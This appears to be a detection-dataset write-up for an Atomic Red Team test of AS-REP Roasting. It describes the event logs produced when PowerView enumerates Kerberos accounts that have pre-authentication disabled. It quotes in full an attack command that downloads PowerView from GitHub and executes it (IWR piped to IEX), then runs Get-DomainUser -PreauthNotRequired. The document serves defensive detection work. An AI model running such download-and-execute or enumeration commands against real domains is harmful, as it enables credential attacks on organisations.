# T1558.004-2: AS-REP Roasting — Get-DomainUser with PowerView

## Technique Context

AS-REP Roasting (T1558.004) harvests Kerberos AS-REP responses from accounts with pre-authentication disabled. This test uses a different approach from the Rubeus-based tests: it imports PowerView (from PowerSploit) and uses `Get-DomainUser -PreauthNotRequired` to enumerate accounts vulnerable to AS-REP Roasting. PowerView is a pure PowerShell LDAP reconnaissance tool — it queries Active Directory using .NET LDAP classes rather than sending raw Kerberos packets. The test here is primarily an enumeration step that identifies which accounts could be targeted, rather than directly obtaining crackable hashes.

## What This Dataset Contains

The dataset spans approximately 2 seconds on 2026-03-17 from ACME-WS06 (acme.local domain) and contains 118 events across PowerShell, Security, and Sysmon channels (no Application channel events in this test).

**The attack command**, captured in Security EID 4688 and Sysmon EID 1:
```
powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose}
```

**Process chain** (Security EID 4688): `whoami.exe` pre-check, the attacking `powershell.exe` with the PowerView IWR-IEX download command, a second `whoami.exe`, and a cleanup `powershell.exe & {}`. Four EID 4688 events.

**Sysmon events** (15 total): Noticeably fewer events than the other T1558 tests in this group, reflecting a shorter execution window (2 seconds vs 5-10 seconds for the others).
- EID 7 (Image Load): 9 events — .NET CLR assemblies loading into PowerShell
- EID 10 (Process Access): 2 events — PowerShell accessing child processes with `0x1fffff` full access, tagged `T1055.001/Dynamic-link Library Injection`
- EID 17 (Pipe Create): 1 event — single `\PSHost.*` named pipe
- EID 1 (Process Create): 2 events — two `whoami.exe` processes
- **EID 8 (CreateRemoteThread): 1 event** — `powershell.exe` (PID 18060) creating a remote thread in `<unknown process>` (PID 13760, the target process no longer running at log time), tagged `technique_id=T1055,technique_name=Process Injection`, thread ID 16356

The Sysmon EID 8 CreateRemoteThread event is notable. PowerView itself does not perform process injection — this event is triggered by PowerShell's AMSI patching behavior or by PowerView's use of `[System.Runtime.InteropServices.Marshal]::WriteInt32()` to patch memory when bypassing certain hooks, or by the sysmon-modular rule firing on cross-process thread creation that occurs during PowerShell's own managed execution. The target `<unknown process>` suggests the target PID had already exited when Sysmon logged the event.

**PowerShell channel** (99 events): 95 EID 4104 records, 2 EID 4103 pipeline records, and 2 EID 4100 error records. The 4103 records show `Set-ExecutionPolicy Bypass`. Two EID 4100 error events indicate pipeline errors during execution — PowerView's verbose LDAP queries or the `Get-DomainUser` call may have generated errors if no vulnerable accounts were found. The full PowerView source code (a ~7000-line script) would be distributed across the EID 4104 blocks in the complete dataset.

**Security channel**: Four EID 4688 events only.

## What This Dataset Does Not Contain

No AS-REP material was harvested. `Get-DomainUser -PreauthNotRequired` performs an LDAP query and returns a list of accounts — it does not itself request AS-REP tickets. The actual hash acquisition would require a follow-up step (e.g., `Get-ASREPHash` or Rubeus). The LDAP query results are not captured in Windows Event Logs unless object access auditing is enabled (it is not in this environment).

No network events (EID 3) or DNS events (EID 22) appeared in the Sysmon breakdown for this test, suggesting either the download happened too quickly to be sampled or those events fell outside the dataset time window. The PowerView download from GitHub would generate at least one DNS query and one network connection.

The Sysmon EID 8 CreateRemoteThread event is unusual and warrants note: the target process is `<unknown process>`, meaning the target PID had terminated by the time Sysmon logged the event. This is an instrumentation artifact rather than evidence of actual code injection.

## Assessment

This is the only test in the T1558 group that uses a pure LDAP enumeration approach rather than directly issuing Kerberos requests. PowerView's `Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose` is an enumeration step that would precede AS-REP hash collection in a real attack chain. An attacker would use this output to identify targets, then use Rubeus or `Get-ASREPHash` to collect the actual hashes.

The 2-second execution window and 15 Sysmon events (versus 40+ in the Rubeus-based tests) reflect PowerView's lightweight footprint relative to Rubeus — it downloads one large PowerShell file and makes LDAP queries rather than loading .NET assemblies or sending Kerberos packets.

Compared with the defended variant (datasets/art/T1558.004-2, Sysmon: 35, Security: 9, PowerShell: 42), the undefended dataset has 118 total events versus 86. The defended run's PowerShell count (42) was nearly identical, suggesting AMSI did not block PowerView in the defended environment (or blocked it after logging substantial content). The EID 8 CreateRemoteThread event appears only in the undefended run's sample set.

## Detection Opportunities Present in This Data

**Security EID 4688 command line**: The full PowerView download URL (PowerSploit Recon repository, pinned commit `f94a5d298a1b4c5dfb1f30a246d9c73d13b22888`) and `Get-DomainUser -PreauthNotRequired` are present verbatim. The `-PreauthNotRequired` flag is a specific AS-REP Roasting enumeration indicator.

**PowerShell EID 4104 script block logging**: The complete PowerView source (7000+ lines) is logged across the EID 4104 blocks. Function names including `Get-DomainUser`, `Get-DomainController`, and PowerView's LDAP infrastructure code are all present in the full dataset.

**Sysmon EID 8 CreateRemoteThread**: The cross-process thread creation from `powershell.exe` into another process during PowerView execution, tagged `T1055/Process Injection`, is an anomalous event from a reconnaissance script that should not require process injection. This warrants investigation even if the target process is `<unknown>`.

**IWR-IEX with PowerSploit URL**: The combination of `IEX (IWR '...' -UseBasicParsing)` with a PowerSploit Recon URL is a high-fidelity indicator. The `-UseBasicParsing` flag is commonly used to avoid Internet Explorer dependency in server contexts and is a distinguishing characteristic of scripted tool downloads.

**LDAP query behavioral pattern**: In an environment with object access auditing enabled, `Get-DomainUser -PreauthNotRequired` would generate LDAP search events (Security EID 4662) on the domain controller querying `userAccountControl` for `0x400000` (DONT_REQ_PREAUTH flag). This dataset does not contain DC-side events, but the workstation telemetry points clearly to when such a query occurred.
